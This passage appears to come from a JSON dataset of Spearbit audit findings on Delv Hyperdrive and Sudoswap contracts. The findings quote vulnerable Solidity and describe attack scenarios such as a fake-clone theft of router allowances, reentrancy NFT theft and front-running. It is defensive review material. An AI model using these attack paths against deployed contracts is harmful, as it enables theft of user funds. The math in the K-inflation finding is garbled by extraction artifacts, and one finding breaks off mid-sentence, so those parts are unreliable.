        "body": "In calculateDistributeExcessIdleShareProceeds we have the following code blocks: if (smallestDelta == 0 || delta.abs() < smallestDelta.abs()) { smallestDelta = delta; closestShareProceeds = shareProceeds; closestPresentValue = presentValue; } // ... if (lastDelta.abs() < smallestDelta.abs()) { closestShareProceeds = shareProceeds; closestPresentValue = presentValue_; } and the implementation of abs is: function abs(int256 a) internal pure returns (int256) { return a < 0 ? -a : a; } and thus note that we have: abs(type(int256).min) // this would revert",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "returndata bombing by _checkpointRewarder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "In _applyCheckpoint the following call is being made if there exists a _checkpointRewarder: if (_checkpointRewarder != address(0)) { bool isTrader = _isTrader; // avoid stack-too-deep (bool _success, ) = _checkpointRewarder.call( abi.encodeCall( IHyperdriveCheckpointRewarder.claimCheckpointReward, (msg.sender, checkpointTime, isTrader) ) ); // NOTE: Avoid unused local variable warning. _success; } Using the above pattern solc compiler copies the return data to memory even though the return data is not being used.and thus a potentially malicious or misconfigured _checkpointRewarder can return a very large return data that would cause the above block to run out of gas.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_effectiveShareReserves() and _marketState.bondReserves can be cached in _calcu- late(Open|Close)(Long|Short)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "In the above context in the _calculate(Open|Close)(Long|Short) (_f) internal functions we have: function _f(/*...*/ ) /*...*/ { // ... (/*...*/ ) = HyperdriveMath.f( _effectiveShareReserves(), _marketState.bondReserves, // ... ); // ... spotPrice = HyperdriveMath.calculateSpotPrice( _effectiveShareReserves(), _marketState.bondReserves, // ... ); // ... } and thus storage slots are read multiple times.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Picking different initial point to address K inflation should be analyzed more throughly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "Both before and after the code change for picking the initial point (z (cid:0)(cid:16), y ) 2 C, the following invariant is satisfied which means both of these points stay on the same ray passing through the origin which sets the given target price or apr and thus the different approach in initialisation is kind of just scaling the curve. The invariant is: ptarget = 1 1 + a (cid:1) (cid:1)tpos = (cid:22)(z (cid:0) (cid:16)) y ts = pspot The general form of how this initialisation point is set is given by the extra constraint that (for a given scaling parameter (cid:21) ): which gives us: and x = cz = c(z (cid:0) (cid:16)) + pspot (cid:1) y (cid:1) (cid:21) y = z pspot c (cid:21) + p1=ts spot (cid:22) (cid:16) = pspot (cid:1) y c (cid:21) and so (cid:21) let's us interpolate between the 2 different implementations 1. Case (cid:21) = 0: This is the case before the code change which gives us: y = (cid:22)(1 + a(cid:1)tpos)1=ts z and (cid:16) = 0 2. Case (cid:21) = 1: This is the new implementation where we have: and In both cases: y = z + p1=ts spot (cid:22) pspot c (cid:16) = pspot (cid:1) y c 10  z still represent the initial share of the HyperDrive pool in the vault.  (cid:16), y are picked so that the spot price of the point (z (cid:0) (cid:16), y ) on the curve C ( pspot ) is the target price ptarget for the given apr a. Note that:  zmin is kept the same between the old and new implementation of the starting point which limits how far the apr can be pushed when one opens a max short then immediately adds liquidity.  The most important part is that upon initialisation the values of (cid:16) and y are comparable: This fact is pretty important and has 2 consequences: 1. When opening a max short and then adding liquidity the scale factor w is given by: (cid:16) = pspot (cid:1) y c (cid:21) w = zmin + (cid:16) + (cid:1)z zmin + (cid:16) and thus w cannot blow up when (cid:21) is around or greater than 1. and note that how w can blowup when (cid:16) is for example 0: w(cid:16)=0 = zmin + (cid:1)z zmin 2. The solvency line also doesn't blow up. The solvency line after the max short and add liquidity trade is given by (below z is just a parameter to define the equation): Lsolve(z) = (cid:0)c(z + w(cid:16) (cid:0) zmin) + w (cid:1) ymin + Lold exp Here is how to derive this equation accurately: Assume we are at the point P0 = (z0 (cid:0) (cid:16)0, y0) 2 C0 before adding liquidity and assume adding liquidity scales the curve by w and so we end up at P1 = (z1 (cid:0) (cid:16)1, y1) = (wz0 (cid:0) w(cid:16)0, wy0) 2 wC0 = C1. The solvency criteria at point P0 is: also note that: z0 (cid:21) Lexp,0 c0 + zmin Lexp,0 = X tm max(0, sL,tm (cid:0) sS,tm ) and assume tm0 is the maturity time for any trade that happens at the current checkpoint then: + max(0, sL,tm0 and so the solvency inequality at point P0 can be split into 2 inequalities so we can get rid of the last use of max: exp,0 + max(0, sL,tm0 (cid:0) sS,tm0 ) ) = L0 Lexp,0 = max(0, sL,tm (cid:0) sS,tm ) X tm6=tm0 (cid:0) sS,tm0 1. This inequality enforces the solvency for all checkpoints except tm0 and happens when sL,tm0 tive: (cid:0) sS,tm0 is nega- 11 2. z0 (cid:21) L0 exp,0 c0 + zmin z0 (cid:21) L0 exp,0 c0 + sL,tm0 (cid:0) sS,tm0 c0 + zmin We are going to focus on the second inequality to define a solvency line LP0 . Assume the next trade (opening or closing a short or long) moves our point P0 by ((cid:1)z, (cid:1)y ) where: 0 = (z, y ) = P0 + ((cid:1)z, (cid:1)y ) = (z0 (cid:0) (cid:16)0 + (cid:1)z, y0 + (cid:1)y) P0 In the above (z, y) represent coordinates in the (ze, y ) domain using the language by Delv. Then the solvency requirement according to the inequality 2. would be: z0 + (cid:1)z (cid:21) L0 exp,0 c0 + sL,tm0 (cid:0) sS,tm0 c0 (cid:0) (cid:1)y + zmin z + (cid:16)0 (cid:21) L0 exp,0 c0 + sL,tm0 (cid:0) sS,tm0 c0 + y0 (cid:0) y + zmin or or y (cid:21) (cid:0)c0(z + (cid:16)0 (cid:0) zmin) + (L0 exp,0 + sL,tm0 (cid:0) sS,tm0 + y0) and thus a solvency line at point P0 is defined as: LP0 : y = (cid:0)c0(z + (cid:16)0 (cid:0) zmin) + (L0 exp,0 + sL,tm0 (cid:0) sS,tm0 + y0) and we can only move on the curve C0 above this line. Now when we add liquidity and scale our point P0 to P1 = wP0 to end up on the curve C1 = wC0, the long exposure and it's related parameters do not change and we can follow the above steps to derive a solvency line at the point P1: LP1 (z) : y = (cid:0)c1(z + (cid:16)1 (cid:0) zmin) + (L0 exp,0 + sL,tm0 (cid:0) sS,tm0 + y1) LP1(z) : y = (cid:0)c1(z + w(cid:16)0 (cid:0) zmin) + (L0 exp,0 + sL,tm0 (cid:0) sS,tm0 + wy0) or: or LP1 (z) = LP0 (z) (cid:0) (c1 (cid:0) c0)(z (cid:0) zmin) (cid:0) (c1w (cid:0) c0)(cid:16)0 + (w (cid:0) 1)y0 and so if c1 (cid:25) c0 and (cid:16)0 is not comparable to y0 and w is big enough one can really translate up the solvency line so that it would hit the new curve C1 at a much higher apr rate and thus lock the pool in those high interest rate regions. 12 parameter description ymin Lold exp is the amount of bond reserves after the max short trade when the effective share reserves is basically around zmin the long exposure after the max short trade Note that if (cid:16) was pretty small or close to 0 compared to ymin how the equation of the Lsolve could blow it up so that it would interest the scaled curve wC very close to the point where one had ended up after adding liquidity. Thus would mean one could only trade on a small portion of the scaled curve to keep the pool solvent and thus the apr would be locked in a high region and one would not be able to bring it back to 0 or close to its initial apr. Here is a graph to view this issue. Now the question is since (cid:16) is basically the sum:  It's initial value.  Any added zombie interests.  Flat trades. and it also scales when one adds or removes liquidity or when there is a negative interest. Then the above blowing up the Lsolve line might be possible again if (cid:16) ends up being a very small or even negative value. 3. Studying K we have: and 1(cid:0)t + 1=(cid:22) 1(cid:0)t pspot c + p1=ts spot (cid:22) K(cid:21)=0 = ((cid:22)z)1(cid:0)ts c (cid:22) 0 B B @ (cid:0) (1 (cid:0) t) t + p spot K(cid:21)=1 = ((cid:22)z)1(cid:0)ts 1 (cid:0) c (cid:22) 0 B B B @ pspot =c pspot c + p1=ts spot (cid:22) It is obvious that K(cid:21)=1 < K(cid:21)=0 and thus the curve has been scaled down and the initial point has been moved closer to the origin on the desired apr ray.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different ways to calculate weighted average apr",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "We have: = f(p) a = 1 (cid:1)tpos 1 p (cid:0) 1 parameter description a (cid:1)tpos p spot apr position duration spot price Note that f is a convex function and thus for weights wi (cid:21) 0 where wi = 1 we have: P f ( X wi (cid:1) pi ) (cid:20) X wi (cid:1) f (pi ) The weighted average apr ( aav ) is taken to be f ( wi (cid:1) pi ). P wi (cid:1) f (pi ) is not used for aav . This could have been it because",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calculating checkpointVaultSharePrice and checkpointWeightedSpotPrice can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "In _applyCheckpoint we have: // If the checkpoint time is the latest checkpoint, we use the current // vault share price and spot price. Otherwise, we use a linear search // to find the closest non-zero vault share price and use that to // perform the checkpoint. We use the weighted spot price from the // checkpoint with the closest vault share price to populate the // weighted spot price. uint256 checkpointVaultSharePrice; uint256 checkpointWeightedSpotPrice; uint256 latestCheckpoint = _latestCheckpoint(); if (_checkpointTime == latestCheckpoint) { checkpointVaultSharePrice = _vaultSharePrice; checkpointWeightedSpotPrice = HyperdriveMath.calculateSpotPrice( _effectiveShareReserves(), _marketState.bondReserves, _initialVaultSharePrice, _timeStretch ); } else { for ( 15 uint256 time = _checkpointTime + _checkpointDuration; ; time += _checkpointDuration ) { // If the time is the latest checkpoint, we use the vault share // price and the current spot price. if (time == latestCheckpoint) { checkpointVaultSharePrice = _vaultSharePrice; checkpointWeightedSpotPrice = HyperdriveMath .calculateSpotPrice( _effectiveShareReserves(), _marketState.bondReserves, _initialVaultSharePrice, _timeStretch ); break; }  s vault share price is non-zero. If it is, t the latest checkpoint, we check to see if // If the time isn  // the checkpoint // that is the vault share price that we // new checkpoint. We // price to instantiate the weighted spot price for the new // checkpoint. checkpointVaultSharePrice = _checkpoints[time].vaultSharePrice; if (checkpointVaultSharePrice != 0) { ll use the corresponding weighted spot ll use to create the   checkpointWeightedSpotPrice = _checkpoints[time] .weightedSpotPrice; break; } } } The above code has an if / else branch as well as a for loop in one of the branches. It also includes 2 break statements where one had forgotten before one of the PRs and had caused an infinite loop in some cases.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clones with malicious extradata are also considered valid clones",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Spearbit discovered that the functions verifying if a contract is a pair do so by only checking the rst 54 bytes (i.e. the Proxy code). An attacker could deploy a contract that starts with the rst 54 bytes of proxy code but have a malicious payload, and these functions will still verify it as a legitimate clone. We have found this to be a critical issue based on the feasibility of a potential exploit. Consider the following scenario: 1. An attacker creates a malicious pair by making a copy of the source of cloneETHPair() supplying malicious values for factory, bondingCurve, nft and poolType using a valid template for the connected contract. 2. The attacker has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid. 3. The Pair is initialized via a copy of initialize() of LSSVMPair, which calls __Ownable_init() to set a malicious owner. 4 4. The malicious owner calls call(), with target equal to the router contract and the calldata for the function pairTransferERC20From(): // Owner is set by pair creator function call(address payable target, bytes calldata data) external onlyOwner { // Factory is malicious LSSVMPairFactoryLike _factory = factory(); // `callAllowed()` is malicious and returns true require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result, ) = target.call{value: 0}(data); require(result, \"Call failed\"); ,! } 5. The check for onlyOwner and require pass, therefore pairTransferERC20From() is called with the malicious Pair as msg.sender. 6. The router checks if it is called from a valid pair via isPair(): function pairTransferERC20From(...) external { // Verify caller is a trusted pair contract // The malicious pair passed this test require(factory.isPair(msg.sender, variant), \"Not pair\"); ... token.safeTransferFrom(from, to, amount); } 7. Because the function isPair() only checks the rst 54 bytes (the runtime code including the implementation address), isPair() does not check for extra parameters factory, bondingCurve, nft or poolType: 5 function isPair(address potentialPair, PairVariant variant) ... { ... } else if (variant == PairVariant.ENUMERABLE_ETH) { return ,! LSSVMPairCloner.isETHPairClone(address(enumerableETHTemplate),potentialPair); } ... } function isETHPairClone(address implementation, address query) ... { ... // Compare expected bytecode with that of the queried contract let other := add(ptr, 0x40) extcodecopy(query, other, 0, 0x36) result := and( eq(mload(ptr), mload(other)), // Checks 32 + 22 = 54 bytes eq(mload(add(ptr, 0x16)), mload(add(other, 0x16))) ) } 8. Now the malicious pair is considered valid, the require statement in pair- TransferERC20From() has passed and tokens can be transferred to the attacker from anyone who has set an allowance for the router.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Factory Owner can steal user funds approved to the Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "A pair owner can make arbitrary calls to any contract that has been approved by the factory owner. The code in the factory intends to prevent 6 router contracts from being approved for calls because router contracts can have access to user funds. An example includes the pairTransferERC20From() function, that can be used to steal funds from any account which has given it approval. The router contracts can nevertheless be whitelisted by rst being removed as a router and then being whitelisted. This way anyone can deploy a pair and use the call function to steal user funds.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing check in the number of Received Tokens when tokens are transferred directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Within the function _validateTokenInput() of LSSVMPairERC20, two methods exist to transfer tokens. In the rst method via router.pairTrans ferERC20From() a check is performed on the number of received tokens. In the second method no checks are done. Recent hacks (e.g. Qubit nance) have successfully exploited safeTransfer- From() functions which did not revert nor transfer tokens. Additionally, with malicious or re-balancing tokens the number of transferred tokens might be dif- ferent from the amount requested to be transferred. 7 function _validateTokenInput(...) ... { ... if (isRouter) { ... // Call router to transfer tokens from user uint256 beforeBalance = _token.balanceOf(_assetRecipient); router.pairTransferERC20From(...) // Verify token transfer (protect pair against malicious router) require( _token.balanceOf(_assetRecipient) - beforeBalance == ,! inputAmount, \"ERC20 not transferred in\"); } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious assetRecipient could get an unfair amount of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The function _swapNFTsForToken() of LSSVMRouter calls safe- TransferFrom(), which then calls ERC721Received of assetRecipient. A ma- licious assetRecipient could manipulate its NFT balance by buying additional NFTs via the Pair and sending or selling them back to the Pair, enabling the malicious actor to obtain an unfair amount of tokens via routerSwapNFTsForTo- ken(). 8 function _swapNFTsForToken(...) ... { ... swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // call to onERC721Received of assetRecipient } ... outputAmount += swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); // checks the token balance of assetRecipient } ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious Router can exploit cacheAssetRecipientNFTBalance to drain pair funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "A malicious router could be whitelisted by an inattentive or a ma- licious factory owner and drain pair funds in the following exploit scenario: 1. Call the cache function. Suppose that the current balance is 10, so it gets cached. 2. Sell 5 NFTs to the pair and get paid using swapNFTsForToken. Total bal- ance is now 15 but the cached balance is still 10. 3. Call routerSwapNFTsForToken. This function will compute total_balance 9 - cached_balance, assume 5 NFTs have been sent to it and pay the user. However, no new NFTs have been sent and it already paid for them in Step 2.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious Router can steal NFTs via Re-Entrancy attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "If the factory owner approves a malicious _router, it is possible for the malicious router to call functions like swapTokenForAnyNFTs() and set is- Router to true. Once that function reaches router.pairTransferERC20From() in _validateTokenInput(), they can re-enter the pair from the router and call swapTokenForAnyNFTs() again. This second time the function reaches router.pairTransferERC20From(), al- lowing the malicious router to execute a token transfer so that the require of _validateTokenInput is satised when the context returns to the pair. When the context returns from the reentrant call back to the original call, the require of _validateTokenInput would still pass because the balance was cached be- fore the reentrant call. Therefore, an attacker will receive 2 NFTs by sending tokens only once.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAllHeldIds() of LSSVMPairMissingEnumerable is vulnerable to a denial of service attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairMissingEnumerable tries to compensate for NFT contracts that do not have ERC721Enumerable implemented. However, this cannot be done for everything as it is possible to use transferFrom() to send an NFT from the same collection to the Pair. In that case the callback on- ERC721Received() will not be triggered and the idSet administration of LSSVM- PairMissingEnumerable will not be updated. This means that nft().balanceO f(address(this)); can be different from the elements in idSet. Assuming an actor accidentally, or on purpose, uses transferFrom() to send additional NFTs to the Pair, getAllHeldIds() will fail as idSet.at(i) for unregistered NFTs will fail. This can be used in a grieng attack. getAllHeldIds() in LSSVMPairMissingEnumerable: function getAllHeldIds() external view override returns (uint256[] memory) { uint256 numNFTs = nft().balanceOf(address(this)); // returns the registered + unregistered NFTs uint256[] memory ids = new uint256[](numNFTs); for (uint256 i; i < numNFTs; i++) { ids[i] = idSet.at(i); // will fail at the unregistered NFTs } return ids; ,! } The following checks performed with _nft.balanceOf() might not be accurate in combination with LSSVMPairMissingEnumerable. Risk is low because any additional NFTs making later calls to _sendAnyNFTsToRecipient() and _send- SpecificNFTsToRecipient() will fail. However, this might make it more difcult to troubleshoot issues. 11 function swapTokenForAnyNFTs(...) .. { ,! ... require((numNFTs > 0) && (numNFTs <= _nft.balanceOf(address(this))),\"Ask for > 0 and <= balanceOf NFTs\"); ... _sendAnyNFTsToRecipient(_nft, nftRecipient, numNFTs); // could fail ... } function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); // '<' should be '<=' ... _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); // could fail ... ,! ,! } Note: The error string < balanceOf NFTs is not accurate.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "With NFT pools the protocol fees end up in assetRecipient instead of _factory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Assume a scenario where an NFT pool with assetRecipient set have the received funds sent directly to the assetRecipient. Now, suppose a user executes the swapTokenForSpecificNFTs(). The function _validateTokenInput() sends the required input funds, including fees to the assetRecipient. The function _payProtocolFee() tries to send the fees to the _factory. However, this function attempts to do so from the pair con- tract. The pair contract does not have any funds because they have been sent directly to the assetRecipient. So following this action the payProtocolFee() lowers the fees to 0 and sends this number to the _factory while fees end up at assetRecipient' instead of at the _factory. The fees then end up at assetRecipient instead of at the _factory. Note:  The same issue occurs in swapTokenForAnyNFTs().  This issue occurs with both ETH and ERC20 NFT Pools, although their logic is slightly different.  This issue occurs both when swapTokenForSpecificNFTs() is called di- rectly as well as indirectly via the LSSVMRouter.  Although the pool fees are 0 with NFT pools, the factory fee is still present.  Luckily, TRADE pools cannot have an assetRecipient as this would also create issues. 13 abstract contract LSSVMPair is Ownable, ReentrancyGuard { ... function swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) { ,! ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); // ,! sends inputAmount to assetRecipient _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); _refundTokenToSender(inputAmount); _payProtocolFee(_factory, protocolFee); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { ... function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairTokenBalance = _token.balanceOf(address(this)); if (protocolFee > pairTokenBalance) { protocolFee = pairTokenBalance; } _token.safeTransfer(address(_factory), protocolFee); // tries to send from the Pair contract } ,! } abstract contract LSSVMPairETH is LSSVMPair { function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairETHBalance = address(this).balance; if (protocolFee > pairETHBalance) { protocolFee = pairETHBalance; } payable(address(_factory)).safeTransferETH(protocolFee); // tries to send from the Pair contract } ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Error codes of Quote functions are unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The error return values from functions getBuyNFTQuote() and getSellNFTQuote() are not checked in contract LSSVMRouter.sol, whereas other functions in contract LSSVMPair.sol do check for error==CurveErrorCodes.Err or.OK. abstract contract LSSVMPair is Ownable, ReentrancyGuard { ,! ,! ,! ... function getBuyNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getSellInfo(...); } function swapTokenForAnyNFTs(...) (uint256 inputAmount) { external payable virtual returns ... (error, ...) = _bondingCurve.getBuyInfo(...); require(error == CurveErrorCodes.Error.OK, \"Bonding curve error\"); ... } } LSSVMRouter.sol#L526 (, , pairOutput, ) = swapList[i].pair.getSellNFTQuote(...); The following contract lines contain the same code snippet below: LSSVMRoute r.sol#L360, LSSVMRouter.sol#L407, LSSVMRouter.sol#L450, LSSVMRouter.so l#L493, LSSVMRouter.sol#L627, LSSVMRouter.sol#L664 (, , pairCost, ) = swapList[i].pair.getBuyNFTQuote(...); Note: The current Curve contracts, which implement the getBuyNFTQuote() and getSellNFTQuote() functions, have a limited number of potential errors. However, future Curve contracts might add additional error codes.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swaps can be front run by Pair Owner to extract any prot from slippage allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "If the user adds a nonzero slippage allowance, the pair owner can front run the swap to increase the fee/spot price and steal all of the slippage allowance. This basically makes sandwich attacks much easier and cheaper to execute for the pair owner.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add check for numItems == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions getBuyInfo() and getSellInfo() in LinearCurve.sol check that numItems != 0. However, the same getBuyInfo() and getSellInfo() functions in ExponentialCurve.sol do not perform this check. 17 contract LinearCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // We only calculate changes for buying 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } function getSellInfo(...) ... { // We only calculate changes for selling 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } } contract ExponentialCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // No check on `numItems` uint256 deltaPowN = delta.fpow(numItems, FixedPointMathLib.WAD); ... } function getSellInfo(... ) ... { // No check on `numItems` uint256 invDelta = ,! FixedPointMathLib.WAD.fdiv(delta,FixedPointMathLib.WAD); ... } } If the code remains unchanged, an erroneous situation may not be caught and funds might be sent when selling 0 NFTs. Luckily, when numItems == 0 then result outputValue of the functions in Expo- nentialCurve is still 0, so there is no real issue. However, it is still important to x this because a derived version of these functions might be used by future developers.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Disallow arbitrary function calls to LSSVMPairETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairETH contains an open fallback() func- tion. The fallback() is most likely necessary because the proxy adds calldata and the receive() function, therefore not receiving the ETH. However, without additional checks any function call to an ETH Pair will succeed. This could result in unforseen scenarios which hackers could potentially exploit. fallback() external payable { emit TokenDeposited(msg.value); }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Only transfer relevant funds for PoolType",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The functions _initializePairETH() and _initializePairERC20() allow for the transfer of ETH/ERC20 and NFTs even when this is not relevant for the PoolType. Although funds can be rescued from the Pair, it is perhaps better to prevent these types of mistakes. 19 function _initializePairETH(...) ... { ... // Transfer initial `ETH` to `pair` // Only relevant for `PoolType.TOKEN` or `PoolType.TRADE` payable(address(_pair)).safeTransferETH(msg.value); ... // Transfer initial `NFT`s from `sender` to `pair` for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } } function _initializePairERC20(...) ... { ... // Transfer initial tokens to pair // Only relevant for PoolType.TOKEN or PoolType.TRADE _token.safeTransferFrom(msg.sender,address(_pair),_initialTokenBalance); ... // Transfer initial NFTs from sender to pair for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check for 0 parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions setCallAllowed() and setBondingCurveAllowed() do not check that target != 0 while the comparable function setRouterAllowed() does check for _router != 0. 20 function setCallAllowed(address payable target, bool isAllowed) external ,! onlyOwner { ... // No check on target callAllowed[target] = isAllowed; } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external ,! onlyOwner { ... // No check on bondingCurve bondingCurveAllowed[bondingCurve] = isAllowed; } function setRouterAllowed(LSSVMRouter _router, bool isAllowed) external onlyOwner { require(address(_router) != address(0), \"0 router address\"); ... routerAllowed[_router] = isAllowed; ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potentially undetected underow In assembly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions factory(), bondingCurve(), nft(), poolType(), and token() have an assembly based calculation where the paramsLength is sub- tracted from calldatasize(). Assembly underow checks are disregarded and if too few parameters are supplied in calls to the functions in the LSSVMPair contract, this calculation may underow, resulting in the values for factory(), bondingCurve(), nft(), poolType(), and token() to be read from unexpected pieces of memory. This will be usually zeroed therefore execution will stop at some point. However, it is safer to prevent this from ever happening. 21 function factory() public pure returns (LSSVMPairFactoryLike _factory) { ... assembly {_factory := shr(0x60,calldataload(sub(calldatasize(), paramsLength)))} ,! } function bondingCurve() public pure returns (ICurve _bondingCurve) { ... assembly {_bondingCurve := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 20)))} ,! } function nft() public pure returns (IERC721 _nft) { ... assembly {_nft := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 40)))} ,! } function poolType() public pure returns (PoolType _poolType) { ... assembly {_poolType := shr(0xf8,calldataload(add(sub(calldatasize(), paramsLength), 60)))} ,! } function token() public pure returns (ERC20 _token) { ... assembly {_token := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 61)))} ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check number of NFTs is not 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions swapNFTsForToken(), routerSwapNFTsForToken(), and getSellNFTQuote() in LSSVMPair.sol do not perform input verication on the number of NFTs. If _bondingCurve.getSellInfo() accidentally happens to re- turn a non-zero value, then an unfair amount of tokens will be given back to the caller. The current two versions of bondingCurve do return 0, but a future version might accidentally return non-zero. Note: 1. getSellInfo() is supposed to return an error when numNFTs == 0, but this does not always happen. This error code is not always checked. function swapNFTsForToken(uint256[] calldata nftIds, ...) external virtual ,! ,! returns (uint256 outputAmount) { ... // No check on `nftIds.length` (error, newSpotPrice, outputAmount, protocolFee) = nftIds.length,..); _bondingCurve.getSellInfo(..., ... } function routerSwapNFTsForToken(address payable tokenRecipient) ... { ,! ... uint256 numNFTs = _nft.balanceOf(getAssetRecipient()) - _assetRecipientNFTBalanceAtTransferStart; ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., numNFTs, ...); ,! } function getSellNFTQuote(uint256 numNFTs) ... { ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = bondingCurve().getSellInfo(..., numNFTs,...); ... ,! } 2. For comparison, the function 